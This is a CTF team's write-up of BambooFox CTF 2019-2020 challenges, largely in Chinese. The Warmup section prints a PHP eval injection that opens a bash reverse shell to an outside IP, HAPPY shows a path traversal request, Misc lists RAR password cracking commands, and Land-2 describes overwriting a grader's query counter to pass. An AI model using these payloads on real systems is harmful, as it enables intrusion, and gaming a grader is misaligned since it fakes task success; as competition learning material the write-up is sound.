# BAMBOOFOX CTF 2019-2020
###### tags: `security` `write-up` `multimeter`
Team: Multemeter 三用電表

:::info
[TOC]
:::

* Team Members
  * chiffon_cake
  * WildfootW
  * soyccan
  * boook

![](https://i.imgur.com/ZEfPy8j.png)
![](https://i.imgur.com/E1R1ZS6.png)

---
# Crypto
## oracle (Solved)
跟`[HW 0x0A] Mandalorian`幾乎一樣，只是m除的數字在這裡是3，在作業是16。
參考資料：https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack
:::success
flag sent by: chiffon_cake
BAMBOOFOX{SimPlE0RACl3}
:::

## Oil Circuit Breaker
(not solved)

---
# OnlineJudge
## Land-1 (solved)
:::success
flag sent by: boook
:::

可以分別二分搜舉行的上下左右的邊界，總共花 128 次。上傳 code 後就可以拿到 flag 了。

code: https://pastebin.com/Cx0QHV1g

## Land-2

由於 grader.c 裡面存放詢問次數的 ```_count=``` 為全域變數，因此可以在 Land.c 裡面也開一個全域的變數然後往前掃找到 ```_count=``` 的位址並把裡面的值歸零，便可以在實際詢問超過 59 的情下通過判斷。
code: https://pastebin.com/0ub4cDgH

---
# Pwn
## note
(not solved)

## APP I
(not solved)

## ABW
(not solved)

---
# Reverse
## How2decompyle
丟 [線上工具](https://www.toolnb.com/tools-lang-zh-TW/pyc.html) 得到 decompyle 的 source code，發現flag的第i個字元不能是restrictions裡面每個字串的第i個字元，又剛好restriction的大小是26，所有可能的字元是小寫英文加上底線，所以剛好可以解出flag的每個字元是什麼。解出來之後還要把capital裡面對應到的字元改成大寫才是flag。
script: https://github.com/ktpss95112/Practices/blob/master/bamboofoxctf/reverse/How2decompyle/solve.py
:::success
flag sent by: chiffon_cake
BambooFox{You_Know_Decompyle_And_Do_Reverse}
:::

## move or not
:::success
flag sent by: boook
BambooFox{dyn4mic_1s_4ls0_gr34t}
:::
有一段在data段的code，執行時會動態把它每個byte+key-0x31再跳過去執行，所以靜態分析會解錯
把那段patch掉再解就行了

![](https://i.imgur.com/foyLrBk.png)

## Emoji encoder
(not solved)

---
# Web
## Web Newbie
在網頁原始碼可以看到有一個被註解掉的hint連結
![](https://i.imgur.com/P5rdWif.png)
連過去之後
![](https://i.imgur.com/t4CSGM1.png)
所以flag就在 http://bamboofox.cs.nctu.edu.tw:8005/flag.txt
:::success
flag sent by: chiffon_cake
BAMBOOFOX{0hhh_n0_s7up1d_li77l3_8ug}
:::

## Warmup (Solved)

:::success
flag sent by: soyccan
BAMBOOFOX{d22a508c497c1ba84fb3e8aab238a74e}
:::
```php
 <?php

    highlight_file(__FILE__);

    if ($x = @$_GET['x'])
        eval(substr($x, 0, 5));
```
- 雖然只吃前5個字元，但可以利用 eval 遞迴代入 $x，讓 $x 的指令被執行
- \`$x\`; 剛好5個字元
    - 讓 \$x =
```
`$x`; bash -c 'bash -i < /dev/tcp/140.112.196.228/12345 >&0'
```
- 拿到 reversed shell -> `cat secret.php`

exploit:
```
curl http://ctf.bamboofox.cs.nctu.edu.tw:8003/ \
--get --data-urlencode \
"x=\`\$x\`; bash -c 'bash -i < /dev/tcp/140.112.196.228/12345 >&0'"
```

## HAPPY (Solved)

:::success
flag sent by: wildfoot
BAMBOOFOX{251d19bd7cb60e72a3825d898bffcee5}
:::
* pwn
發現 curl 和 browser 都會把 `/../index.html` 自動 filter 成 `/index.html`，所以要手動送 HTTP header
另外要注意 `read_req_path_start` 中，`PATH`是要讀到 `0x20(AL)` (scasb指令) 所以最後記得給他一個 `SPACE`
![](https://i.imgur.com/qCp9K75.png)

`GET /../../../../../../home/web/flags/flag1.txt `
![](https://i.imgur.com/fVyBPmL.png)

## NEW
- 先利用 leak 的 .git 把 source 抓下來 (idea from chiffon_cake)

![](https://i.imgur.com/zaFjIia.png)
```
[pid 365963] write(1, "uid=0(root) gid=0(root) groups=0"..., 39uid=0(root) gid=0(root) groups=0(root)
[pid 372940] write(4, "<!DOCTYPE HTML>\n<html>\n<head>\n  "..., 118) = 118
```
```
cat /proc/590872/maps
00400000-00401000 r-xp 00000000 08:01 3943856      /server_soyccan.out
00600000-00601000 rwxp 00000000 08:01 3943856      /server_soyccan.out
7ffdc96ee000-7ffdc970f000 rwxp 00000000 00:00 0    [stack]
7ffdc979e000-7ffdc97a1000 r--p 00000000 00:00 0    [vvar]
7ffdc97a1000-7ffdc97a2000 r-xp 00000000 00:00 0    [vdso]
```
```
00400000-00402000 r-xp 00000000 08:01 3941840      /server.out
00402000-00403000 rwxp 00002000 08:01 3941840      /server.out
7fffe5f39000-7fffe5f5a000 rwxp 00000000 00:00 0    [stack]
7fffe5fa7000-7fffe5faa000 r--p 00000000 00:00 0    [vvar]
7fffe5faa000-7fffe5fab000 r-xp 00000000 00:00 0    [vdso]
```

## Messy PHP
> solved by chiffon_cake

這題真的很煩，那個笑臉字元肯定是癌症(X

* 首先這題總共最多有6個參數，首先在第15行的地方有4個參數的可能，先定義叫作「平笑臉1」、「歪笑臉1」、「KEY」和「is_this_flag？」。
  ![](https://i.imgur.com/0QLvP4R.png)
  再來是第43行這邊有兩個參數，叫作「平笑臉2」和「歪笑臉2」。
  ![](https://i.imgur.com/ve6CR2x.png)
  **特別注意，平笑臉1和平笑臉2是不同的兩個字元，所以要當成兩個參數來送。歪笑臉1和歪笑臉2同理。**
  ![](https://i.imgur.com/wfBlq78.png)

* 這個php會接收我們送的參數，把平笑臉1、歪笑臉1和KEY拿去對flag操作之後，計算平笑臉2跟歪笑臉2的md5，如果相等的話就把對flag操作完的結果回傳給我們看。這裡的操作指的是跟rand()來xor。
  ![](https://i.imgur.com/hzbBFL2.png)
    * 特別注意到，在第16行的srand是我們可以知道的（連線建立的那個時間點），所以rand()函數的行為完全可以預測。
    * `random_int(1,128)`跟srand無關，所以對我們來說這個數字是真隨機。
* 為了消除`random_int(1,128)`的影響，我們可以把KEY的值設成0，這樣0乘以任何隨機數都會是0，變成我們可以預測的數字。
* 因為md5之後的檢查是弱檢查，所以我們可以把平笑臉放上任何`0e`開頭的字串就會通過檢查。
* 最後，拿到server回傳的值之後，就在local做跟server一模一樣的運算，把xor過的flag給還原回來，就拿到flag了~

script: https://github.com/ktpss95112/Practices/blob/master/bamboofoxctf/web/MessyPHP/solve.php
:::success
flag sent by: chiffon_cake
BAMBOOFOX{WHY_THERE_ARE_UNICODE_LA}
:::

## Da Ji
(not solved)

---
# Misc
## I can't see you!

### attempt: password attack
seems impractical 
`.\hashcat64.exe -m 13000 -a 3 Z:\Temporary_Share\what_rar_password_hash.txt ?u?u?u?u?u?u?u?u`
![](https://i.imgur.com/II7KtDt.png)

### john tool from Kali Linux
- https://tools.kali.org/password-attacks/john
    - https://gitlab.com/kalilinux/packages/john.git
- https://tools.kali.org/password-attacks/wordlists
    - https://gitlab.com/kalilinux/packages/wordlists.git 
```
./john/run/rar2john what.rar > what.passwd.hash
./john/run/john \
    --wordlist=./wordlists/rockyou.txt \
    --format=rar5 what.passwd.hash
./john/run/john --show what.passwd.hash
# output => what.rar:blind
rar x -p'blind' what.rar
# get => picture.png
```
picture.png: (一眼就看出是點字！)

![](https://i.imgur.com/lQDIL2E.png)

```
+----------+
|bamboofox |
|.( ya_you_|
|know_what_|
|blind_    |
|means .)  |
+----------+
```
(statement says all capital letters)
:::info
not solved in competition
BAMBOOFOX{YA_YOU_KNOW_WHAT_BLIND_MEANS}
:::

### for lazy people
https://www.lostmypass.com/file-types/rar/


## Find the Cat (Solved)
:::success
flag sent by: soyccan
BAMBOOFOX{Y0u_f1nd_th3_h1dd3n_c4t!!!}
:::
![](https://i.imgur.com/BR0UZfE.png)
`pngchecker -vf cat.png`
-> found the image file invalid
`xxd cat.png`
-> found the image concatenated of two PNG files
`head -c 371383 cat.png > b.png`
`tail -c +371383 cat.png > a.png`
-> use stegsolver to substract a.png and b.png
-> get QR Code
-> leads to imgur: Xrv86y2.jpg
-> download Xrv86y2.jpg, it's a text file
`strings Xrv86y2.jpg | sed 's/bamboofox/\n\nbamboofox/gi'`
-> human-eye-based search for flag

## AlphaGO (Solved)
:::success
flag sent by: wildfoot
BAMBOOFOX{G0_1s_v3ry_fun}
:::

hint (SHA256): e01ddf6594a4387bbf520e7d678578151b8824849cc02783c66e9da6c07f953e
丟給: https://hashes.org/ (idea from wildfoot)
得到: 1st

線上棋譜：https://deepmind.com/alphago-chinese
**FIRST** game where AlphaGo vs. Lee Sedol
照下的順序對應圖片解出 flag (idea from soyccan)

## Tree (Solved)
把zip解開來之後，發現有一堆資料夾，看起來每個資料夾都對應到一個flag的byte。![](https://i.imgur.com/hsHtevK.png)

用tree指令簡單瞄一下，果然長得很像tree。
![](https://i.imgur.com/svneBXW.png)

在一點點靈力的加持下，通出來了！
每個資料夾都會是`n_o`的形式，其中`o`代表的是要用什麼運算符號來操作當前資料夾下的兩個數字，而`n`代表的則是這樣運算完之後，他自己會代表什麼數字。
或者換另外一種說法，每個資料夾代表的就是一個帶有加法或乘法的節點，每個`0_number`或`1_number`代表的是一個包含數字的節點。建立起來的樹就會是一顆運算樹，舉例如下圖：
![](https://i.imgur.com/IJk5dEe.png)

所以就寫一個python3 script來DFS，把每個資料夾的結果都算出來，就得到flag了~
script: https://github.com/ktpss95112/Practices/blob/master/bamboofoxctf/misc/Tree/solve.py
:::success
flag sent by: chiffon_cake
BAMBOOFOX{Dir_3xpres5i0n_tre3e33eeee}
:::

---
# General
## Happy New Year (Solved)

## we1c0me (Solved)

